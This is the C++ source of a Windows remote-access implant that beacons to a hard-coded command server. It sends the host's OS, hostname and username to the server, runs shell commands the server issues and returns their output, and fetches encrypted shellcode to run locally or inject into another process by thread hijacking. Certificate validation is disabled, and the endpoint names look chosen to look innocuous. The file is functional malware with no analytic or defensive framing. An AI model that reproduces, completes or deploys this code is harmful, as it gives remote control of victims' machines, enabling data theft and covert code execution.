#include <Windows.h>
#include <WinHttp.h>
#include <fstream>
#include <locale>
#include <codecvt>
#include <vector>
#include <wincrypt.h>
#include <iostream>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <cstring>
#include <string>
#include <wchar.h>
#include <cstdio>
#include <array>
#include <TlHelp32.h>
#include <thread>


#pragma comment(lib, "winhttp.lib")

using std::string;

const char* key = "thisisakey:)1234"; // REPLACE THIS

const int sleep_time = 5000;

HCRYPTPROV hCryptProv = NULL;
HCRYPTKEY hKey = NULL;

#define AES_BLOCK_SIZE 16
#define NAME_LEN 4

// Boooo warnings boooo
#define _CRT_SECURE_NO_WARNINGS

// To generate and replace
// 1. server_url
// 2. encryption key

std::wstring server_url = L"https://192.168.4.61"; // REPLACE THIS
std::wstring server_ip = L"192.168.4.61";
INTERNET_PORT server_port = 443;

enum REQ_TYPE {
    LOGIN,
    GET,
    RESP,
};

std::string get_file(const wchar_t* file_id)
{
    //Variables 
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPBYTE pszOutBuffer;

    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, server_ip.c_str(), server_port, 0);

    // Make the right path for the file
    std::wstring path_to_file = L"/recipes/download/";
    path_to_file.append(file_id);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path_to_file.data(), NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        std::cout << GetLastError() << std::endl;
    }
    // Fix up the security flags to allow self-signed certs
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)))
    {
        // Handle error
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    
    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);/**/
    // Keep checking for data until there is nothing left.
    //HANDLE hFile = CreateFile(L"C:\\Windows\\Temp\\test.shellcode", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    std::string bytes;
    if (bResults)
        do
        {
            // Check for available data.        
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            // Allocate space for the buffer.        
            pszOutBuffer = new byte[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.            
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
                    //printf("%s", pszOutBuffer); 
                    DWORD wmWritten;
                    //bool fr = WriteFile(hFile, pszOutBuffer, dwSize, &wmWritten, NULL);
                    bytes.append((char*)pszOutBuffer, dwSize);
                    int n = GetLastError();
                }
                // Free the memory allocated to the buffer.            
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
        //CloseHandle(hFile);
        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());
        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
        return bytes;
}

std::wstring http_req(const wchar_t* server_url, const char* post_body, const wchar_t* GET_POST, REQ_TYPE request_type, const wchar_t* name)
{
    DWORD dwSize = 0;
    LPVOID lpOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"Automatic Sync/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    std::wstring url{ server_url };
    URL_COMPONENTS components{};
    components.dwStructSize = sizeof(components);
    components.dwHostNameLength = (DWORD)-1;
    components.dwUrlPathLength = (DWORD)-1;
    if (!WinHttpCrackUrl(url.c_str(), static_cast<DWORD>(url.length()), 0, &components)) {
        int a = 1;
    }

    std::wstring hostName(components.lpszHostName ? std::wstring{ components.lpszHostName, components.dwHostNameLength } : L"localhost");
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, hostName.c_str(),
            server_port, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, GET_POST, components.lpszUrlPath,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    const char* RequestBody = post_body;

    // Allow self signed certs
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)))
    {
        // Handle error
        /*WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);*/
        int do_nothing = 1;
    }

    if (request_type == LOGIN) {
        bResults = WinHttpSendRequest(hRequest, NULL, NULL,
            (LPVOID)RequestBody,
            strlen(RequestBody),
            strlen(RequestBody),
            NULL);
        if (!bResults) {
            std::cout << GetLastError() << std::endl;
        }
    }
    else if (name != NULL) {
        std::wstring sessid = L"Cookie: ";
        sessid += name;
        bResults = WinHttpSendRequest(hRequest, sessid.data(), sessid.length(),
            (LPVOID)RequestBody,
            strlen(RequestBody),
            strlen(RequestBody),
            NULL);
    }


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    std::wstring ret;

    // First, use WinHttpQueryHeaders to obtain the size of the buffer.
    if (bResults)
    {


        if (request_type == LOGIN) {


            wchar_t* cookie = NULL;
            DWORD dwSize = 0;

            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM,
                L"Cookie", NULL,
                &dwSize, WINHTTP_NO_HEADER_INDEX);

            // Allocate memory for the buffer.
            if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
            {
                cookie = new WCHAR[dwSize / sizeof(WCHAR)];

                // Now, use WinHttpQueryHeaders to retrieve the header.
                bResults = WinHttpQueryHeaders(hRequest,
                    WINHTTP_QUERY_CUSTOM,
                    L"Cookie",
                    cookie, &dwSize,
                    WINHTTP_NO_HEADER_INDEX);
            }
            std::wstring s_cookie = cookie;
            return s_cookie;

        }
        if (request_type == GET) {
            // Need to get the response now
            wchar_t* pszOutBuffer;
            DWORD dwDownloaded = 0;
            do
            {
                // Check for available data.
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                {
                    printf("Error %u in WinHttpQueryDataAvailable.\n",
                        GetLastError());
                    break;
                }

                // No more available data.
                if (!dwSize)
                    break;

                // Allocate space for the buffer.
                pszOutBuffer = new wchar_t[dwSize + 1];
                if (!pszOutBuffer)
                {
                    printf("Out of memory\n");
                    break;
                }

                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {

                    ret.append(pszOutBuffer, dwSize);

                }

            } while (dwSize > 0);
            return ret;

        }

    }


    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return L"";
}

BOOL AesInitialization()
{
    const char* stage = "n/a";
    BOOL success = TRUE;

    HCRYPTHASH hHash = NULL;

    if (success) {
        stage = "CryptAcquireContext";
        success = CryptAcquireContext(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, NULL);
    }
    if (success) {
        stage = "CryptCreateHash";
        success = CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash);
    }
    if (success) {
        stage = "CryptHashData";
        success = CryptHashData(hHash, (BYTE*)key, strlen(key), 0);
    }
    if (success) {
        stage = "CryptDeriveKey";
        success = CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey);
    }
    if (success) {
        stage = "CryptSetKeyParam";
        DWORD dwMode = CRYPT_MODE_CBC;
        success = CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    }
    if (hHash != NULL) CryptDestroyHash(hHash);
    return success;
}

BOOL AesEncrypt(string& data, string& iv)
{
    const char* stage = "n/a";
    BOOL success = TRUE;

    if (success) {
        stage = "CryptGenRandom";
        iv.resize(AES_BLOCK_SIZE);  // allocate space for random IV
        success = CryptGenRandom(hCryptProv, AES_BLOCK_SIZE, (BYTE*)&iv[0]);
    }
    if (success) {
        stage = "CryptSetKeyParam";
        success = CryptSetKeyParam(hKey, KP_IV, (BYTE*)&iv[0], 0);
    }
    if (success) {
        stage = "CryptEncrypt";
        DWORD dwDataLen = data.length();
        data.resize(dwDataLen + AES_BLOCK_SIZE); // give enough space for padding
        success = CryptEncrypt(hKey, NULL, TRUE, 0, (BYTE*)&data[0], &dwDataLen, data.length());
        data.resize(dwDataLen);  // resize to actual ciphertext length
    }

    return success;
}

BOOL AesDecrypt(string& data, string& iv)
{
    const char* stage = "n/a";
    BOOL success = TRUE;

    if (success) {
        stage = "CryptSetKeyParam";
        iv.resize(AES_BLOCK_SIZE);  // ensure IV has the correct size
        success = CryptSetKeyParam(hKey, KP_IV, (BYTE*)&iv[0], 0);
    }
    if (success) {
        stage = "CryptDecrypt";
        DWORD dwDataLen = data.length();
        success = CryptDecrypt(hKey, NULL, TRUE, 0, (BYTE*)&data[0], &dwDataLen);
        data.resize(dwDataLen);  // resize to actual ciphertext length
    }

    return success;
}

static std::string base64_decode(const std::string& in) {

    std::string out;

    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (BYTE c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

static const unsigned char base64_table[65] =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
* base64_encode - Base64 encode
* @src: Data to be encoded
* @len: Length of the data to be encoded
* @out_len: Pointer to output length variable, or %NULL if not used
* Returns: Allocated buffer of out_len bytes of encoded data,
* or empty string on failure
*/
std::string base64_encode(const unsigned char* src, size_t len)
{
    unsigned char* out, * pos;
    const unsigned char* end, * in;

    size_t olen;

    olen = 4 * ((len + 2) / 3); /* 3-byte blocks to 4-byte */

    if (olen < len)
        return std::string(); /* integer overflow */

    std::string outStr;
    outStr.resize(olen);
    out = (unsigned char*)&outStr[0];

    end = src + len;
    in = src;
    pos = out;
    while (end - in >= 3) {
        *pos++ = base64_table[in[0] >> 2];
        *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
        *pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
        *pos++ = base64_table[in[2] & 0x3f];
        in += 3;
    }

    if (end - in) {
        *pos++ = base64_table[in[0] >> 2];
        if (end - in == 1) {
            *pos++ = base64_table[(in[0] & 0x03) << 4];
            *pos++ = '=';
        }
        else {
            *pos++ = base64_table[((in[0] & 0x03) << 4) |
                (in[1] >> 4)];
            *pos++ = base64_table[(in[1] & 0x0f) << 2];
        }
        *pos++ = '=';
    }

    return outStr;
}

std::string exec_and_return(const char* cmd) {
    std::array<char, 1024> buffer;
    std::string result;

    auto pipe = _popen(cmd, "r"); // get rid of shared_ptr

    if (!pipe) throw std::runtime_error("popen() failed!");

    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
            result += buffer.data();
    }

    auto rc = _pclose(pipe);

    if (rc == EXIT_SUCCESS) { // == 0

    }
    else if (rc == EXIT_FAILURE) {  // EXIT_FAILURE is not used by all programs, maybe needs some adaptation.

    }
    return result;
}

std::vector<std::string> splitString(const std::string& str, const std::string& delimiter)
{
    std::vector<std::string> substrings;
    std::string::size_type start = 0;
    std::string::size_type end = str.find(delimiter, start);
    while (end != std::string::npos) {
        substrings.push_back(str.substr(start, end - start));
        start = end + delimiter.length();
        end = str.find(delimiter, start);
    }
    substrings.push_back(str.substr(start));
    return substrings;
}

DWORD WINAPI ThreadFunc(LPVOID lpParameter)
{
    // Cast the parameter back to the shellcode pointer type
    unsigned char* shellcode = (unsigned char*)lpParameter;

    // Execute the shellcode
    void (*execute)() = (void (*)())shellcode;
    execute();

    return 0;
}

#define FUCKUP_PAD "1234567812345678"

int main()
{
    if (!AesInitialization()) return 1;
    std::string iv;

    // Start the main loop


    // Check in with the server
    // 1. Get OS info - DONT FORGET TO PAD 16 BYTES TO THE BEGINNING!!.. because i fucked up something with aes, 
    //                                                         Ill just call it "unintentional obfuscation" :)
    // 2. Encrypt it 
    // 3. B64 encode it
    // 4. Send it over to server_url/login

    // Getting the OS info
    unsigned int osver = 0.0;
    unsigned int build_num = 0.0;

    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osInfo;

    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion)
    {
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);
        RtlGetVersion(&osInfo);
        osver = osInfo.dwMajorVersion;
        build_num = osInfo.dwBuildNumber;
    }
    // Get the user
    char username[1024];
    DWORD username_len = 1024;
    GetUserNameA(username, &username_len);
    // Get the hostname
    char hostname[1024];
    DWORD hostname_len = 1024;
    GetComputerNameA(hostname, &hostname_len);

    // Converting OS info to str
    char login_fmt[1024];
    sprintf(login_fmt, "%d:::%d:::%d:::%s\\%s", osver, build_num, sleep_time, hostname, username);

    //...now need to pad 16 bytes
    std::string login_msg = FUCKUP_PAD;
    // Append the actual data
    login_msg.append(login_fmt);

    // Encrypt the message
    if (!AesEncrypt(login_msg, iv)) return 1;

    // Encode the message
    std::string b64_login_msg = base64_encode((const unsigned char*)login_msg.data(), login_msg.length());

    // Send the login message, and get the name of the implant back from the PHPSESSID header
    REQ_TYPE lg = LOGIN;
    std::wstring l_url = server_url.data();
    l_url.append(L"/login");

    std::wstring cookie;

    // The login timer, exits once cookie is populated
    while (cookie.size() == 0) {
        cookie = http_req(l_url.data(), b64_login_msg.data(), L"POST", lg, NULL);
        Sleep(sleep_time);
    }

    // Now get into the main loop
    while (1) {
        // Get a command
        REQ_TYPE g = GET;
        std::wstring g_url = server_url.data();
        g_url.append(L"/recipes");
        std::wstring cmd = http_req(g_url.data(), "", L"GET", g, cookie.data());

        BYTE* raw = (BYTE*)cmd.data();
        std::string to_decode = (char*)raw;

        // I dont want to talk about this if statement Ill refactor later I promise
        if (to_decode.length() < 10) {
            int DO_NOTHING = 1;
        }
        else {
            // Need to cast to char - only sending over ascii / utf-8
            BYTE* raw = (BYTE*)cmd.data();
            std::string to_decode = (char*)raw;

            // Now need to base64_decode it
            std::string encrypted = base64_decode(to_decode);

            // And then decrypt it
            AesDecrypt(encrypted, iv);

            // Need to remove the 16 byte pad at the front...
            std::string plain = encrypted.substr(16, encrypted.length() - 1);

            // Now need to split the string by the ::: delimiter
            std::vector<std::string> parsed_cmd = splitString(plain, ":::");

            // Extract command ID
            std::string cmd_id = parsed_cmd[0];

            // If statements for the rest of the command
            // If exit
            if (parsed_cmd[1] == "CMD_KILL") {

                // Pad 16 bytes
                std::string exit_confirm = FUCKUP_PAD;

                // append the command id first
                exit_confirm.append(cmd_id.data());
                exit_confirm.append(":::");

                // then the kill_id to confirm
                exit_confirm.append(parsed_cmd[2]);

                // Now need to encrypt the data
                AesEncrypt(exit_confirm, iv);

                // Now encode it
                std::string b64_out_msg = base64_encode((const unsigned char*)exit_confirm.data(), exit_confirm.length());

                // And send the data back to /comment
                REQ_TYPE r = RESP;
                std::wstring r_url = server_url.data();
                r_url.append(L"/comment");

                std::wstring bak = http_req(r_url.data(), b64_out_msg.data(), L"POST", r, cookie.data());

                return 0;
            }
            // If shell exec
            if (parsed_cmd[1] == "CMD_SHELL") {
                std::string sys = "cmd /c ";
                sys.append(parsed_cmd[2]);
                std::string out = exec_and_return(sys.data());

                // Pad 16 bytes
                std::string to_send = FUCKUP_PAD;

                // Add the cmd_id
                to_send.append(cmd_id.data());

                // Add the delimiter
                to_send.append(":::");

                // Add the output
                to_send.append(out.data());

                // Now need to encrypt the data
                AesEncrypt(to_send, iv);

                // Now encode it
                std::string b64_out_msg = base64_encode((const unsigned char*)to_send.data(), to_send.length());

                // And send the data back to /comment
                REQ_TYPE r = RESP;
                std::wstring r_url = server_url.data();
                r_url.append(L"/comment");

                std::wstring bak = http_req(r_url.data(), b64_out_msg.data(), L"POST", r, cookie.data());
            }
            // If shellcode-inject
            if (parsed_cmd[1] == "CMD_SHELLCODE_INJECT") {
                // Pull out the shellcode file id on the server
                std::string utf8_file_id = parsed_cmd[2];
                // Convert it to wide for the web request
                std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
                std::wstring w_file_id = converter.from_bytes(utf8_file_id);



                // Start to config the request to the location on the server
                REQ_TYPE g = GET;
                std::wstring file_url = server_url.data();
                // Append the endpoint and file ID
                file_url.append(L"/recipes/download/");
                file_url.append(w_file_id);

                // Make the request to get the file of shellcode
                std::string b64_enc_shc = get_file(w_file_id.data());

                // Now need to base64 decode
                std::string enc_shc = base64_decode(b64_enc_shc);

                // Now need to decrypt
                AesDecrypt(enc_shc, iv);

                // Need to remove the 16 byte pad at the front...
                std::string raw_code_str = enc_shc.substr(16, enc_shc.length() - 1);

                unsigned int len = raw_code_str.length();

                char* shellcode = (char*)raw_code_str.data();

                HANDLE targetProcessHandle;
                PVOID remoteBuffer;
                HANDLE threadHijacked = NULL;
                HANDLE snapshot;
                THREADENTRY32 threadEntry;
                CONTEXT context;

                // Pull out the PID to inject into
                DWORD targetPID = std::stoi(parsed_cmd[3].data());
                context.ContextFlags = CONTEXT_FULL;
                threadEntry.dwSize = sizeof(THREADENTRY32);

                targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
                remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, len, NULL);

                snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                Thread32First(snapshot, &threadEntry);
                while (Thread32Next(snapshot, &threadEntry)) {
                    if (threadEntry.th32OwnerProcessID == targetPID)
                    {
                        threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                        break;
                    }
                }

                SuspendThread(threadHijacked);

                GetThreadContext(threadHijacked, &context);
                context.Rip = (DWORD_PTR)remoteBuffer;
                SetThreadContext(threadHijacked, &context);

                ResumeThread(threadHijacked);

            }
            if (parsed_cmd[1] == "CMD_SHELLCODE_SPAWN") {
                // Pull out the shellcode file id on the server
                std::string utf8_file_id = parsed_cmd[2];
                // Convert it to wide for the web request
                std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
                std::wstring w_file_id = converter.from_bytes(utf8_file_id);

                // Start to config the request to the location on the server
                REQ_TYPE g = GET;
                std::wstring file_url = server_url.data();
                // Append the endpoint and file ID
                file_url.append(L"/recipes/download/");
                file_url.append(w_file_id);

                // Make the request to get the file of shellcode
                std::string b64_enc_shc = get_file(w_file_id.data());

                // Now need to base64 decode
                std::string enc_shc = base64_decode(b64_enc_shc);

                // Now need to decrypt
                AesDecrypt(enc_shc, iv);

                // Need to remove the 16 byte fcpad at the front...
                std::string raw_code = enc_shc.substr(16, enc_shc.length() - 1);

                // Allocate some space for it
                unsigned int len = raw_code.length();
                // Allocate the payload var without the pesky \00 added by .data()
                unsigned char* pl = (unsigned char*)malloc(len);
                for (int i = 0; i < raw_code.length(); i++) {
                    pl[i] = raw_code.data()[i];
                }
                // Now execute the shellcode in a new thread
                HANDLE hThread = NULL;
                void* exec_mem;

                // if directed to use RW memory only
                if (parsed_cmd.size() == 4 && parsed_cmd[3] == "RX") {
                    DWORD oldprotect = 0;

                    exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                    memcpy(exec_mem, pl, len);

                    bool rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

                    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, exec_mem, 0, 0);
                }
                // If directed to use RWX memory (default)
                else {
                    exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    memcpy(exec_mem, pl, len);
                    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
                }                

                // Close the thread handle
                CloseHandle(hThread);

            }
        }

        // To obfuscate later
        Sleep(sleep_time);
    }

    return 0;
}

